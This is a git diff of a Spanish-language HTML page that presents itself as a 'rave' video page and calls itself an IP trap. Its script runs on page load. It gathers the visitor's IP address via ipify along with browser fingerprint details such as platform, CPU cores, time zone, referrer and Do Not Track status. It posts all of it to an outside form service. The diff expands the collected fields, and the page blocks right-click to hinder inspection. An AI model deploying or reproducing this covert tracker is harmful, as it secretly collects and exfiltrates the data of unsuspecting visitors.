@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Prueba - Te Vas Trackeado</title>
+    <title>ACABAS DE SER TRACKEADO POR MI PAGINA -LAUTYY33</title>
     <style>
         body {
             font-family: 'Arial Black', sans-serif;
@@ -16,7 +16,6 @@
             color: #00ff99; /* Neón verde */
             text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
             margin-bottom: 5px;
-            /* Estilo para el script de parpadeo */
             transition: visibility 0.5s;
         }
         p {
@@ -28,27 +27,36 @@
             box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
             border-radius: 8px;
             margin-top: 20px;
-            transition: border-color 0.5s, box-shadow 0.5s; /* Para el script de cambio de color */
+            transition: border-color 0.5s, box-shadow 0.5s;
         }
     </style>
 </head>
 <body>
-    <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
-    <p>Presiona Play para iniciar la secuencia de 10 segundos. (No se activa solo)</p>
+    <h1>BIENVENIDO USUARIO DE RAVE: TE VAS TRACKEADO</h1>
+    <p>CODIGO Y SCRITS BY 33 - TEMA HOSTING Y SERVIDOR 32</p>
 
     <video width="720" controls> 
       <source src="clip.mp4" type="video/mp4">
       Tu navegador no puede reproducir este video.
     </video>
 
-    <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>
+    <p>TRAMPA CAZA IPS VERSION</p>
 
-    <script>
-        // --- 1. Recolección de datos del dispositivo ---
+    <script> 
+        // --- 1. Recolección de datos avanzados del dispositivo y sistema ---
         const userAgent = navigator.userAgent;
         const userLanguage = navigator.language || navigator.userLanguage;
         const screenRes = window.screen.width + 'x' + window.screen.height;
-
+        
+        // Datos de Hardware / Seguridad (Browser Fingerprinting)
+        const dntStatus = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+        const touchScreen = ('ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) ? 'Sí' : 'No';
+        const cpuCores = navigator.hardwareConcurrency || 'Desconocido';
+        const platform = navigator.platform;
+        const colorDepth = screen.colorDepth; // Profundidad de color de la pantalla (ej. 24)
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Zona horaria
+        const referrer = document.referrer || 'Acceso Directo'; // De dónde vino el usuario
+        
         // --- 2. Obtener la IP y enviar todos los datos a FormSubmit ---
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
@@ -66,11 +74,21 @@
                         'Accept': 'application/json'
                     },
                     body: JSON.stringify({
-                        "_subject": "DATOS CAPTURADOS - TeVasTrackeado", 
+                        "_subject": "MÁXIMA CAPTURA DE DATOS - TeVasTrackeado", 
+                        // --- Información de Red ---
                         "IP_Visitante": userIP, 
+                        "Referencia_Web": referrer, // De dónde vino
+                        // --- Información del Dispositivo ---
                         "Agente_de_Usuario": userAgent,
-                        "Idioma": userLanguage,
+                        "Plataforma_SO": platform,
+                        "Nucleos_CPU": cpuCores,
+                        "Touch_Screen": touchScreen,
                         "Resolucion": screenRes,
+                        "Profundidad_Color": colorDepth,
+                        // --- Información de Configuración ---
+                        "DNT_Activado": dntStatus, // Estado de Do Not Track
+                        "Idioma": userLanguage,
+                        "Zona_Horaria": timeZone,
                         "Fecha_Hora_Visita": new Date().toLocaleString()
                     })
                 })
@@ -85,7 +103,7 @@
             var h1 = document.querySelector('h1');
             h1.style.visibility = (h1.style.visibility === 'hidden' ? 'visible' : 'hidden');
         }
-        setInterval(blink, 500); // Parpadea cada medio segundo
+        setInterval(blink, 500);
 
         // Efecto 2: Cambio de Color de Borde Aleatorio (Rave)
         function changeBorderColor() {
@@ -94,7 +112,7 @@
             video.style.borderColor = randomColor;
             video.style.boxShadow = `0 0 25px ${randomColor}`;
         }
-        setInterval(changeBorderColor, 2000); // Cambia cada 2 segundos
+        setInterval(changeBorderColor, 2000);
 
         // Efecto 3: Bloqueo del Clic Derecho (Anti-Inspección)
         document.addEventListener('contextmenu', function(e) {
